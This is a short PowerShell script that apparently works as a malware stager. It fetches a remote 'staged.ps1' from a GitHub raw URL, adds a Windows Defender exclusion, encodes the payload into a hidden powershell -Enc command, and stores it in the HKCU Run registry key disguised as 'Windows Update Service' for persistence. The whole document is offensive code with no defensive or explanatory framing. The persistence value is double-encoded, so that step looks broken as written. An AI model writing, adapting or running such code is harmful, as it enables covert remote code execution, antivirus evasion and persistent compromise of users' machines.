$githubLink = "https://raw.githubusercontent.com/partymonster2/Batch-Scripts/main/staged.ps1"

$wc = New-Object System.Net.WebClient
$payload = $wc.DownloadString($githubLink)

$defenderExclusionPath = "C:\Path\To\Your\staged.ps1"
Add-MpPreference -ExclusionPath $defenderExclusionPath

$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encodedPayload = [Convert]::ToBase64String($bytes)
$encodedCommand = "powershell.exe -NoP -NonI -W Hidden -Enc $encodedPayload"
$encodedCommandBytes = [System.Text.Encoding]::Unicode.GetBytes($encodedCommand)
$encodedCommandBase64 = [Convert]::ToBase64String($encodedCommandBytes)

$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$regName = "Windows Update Service"
Set-ItemProperty -Path $regPath -Name $regName -Value $encodedCommandBase64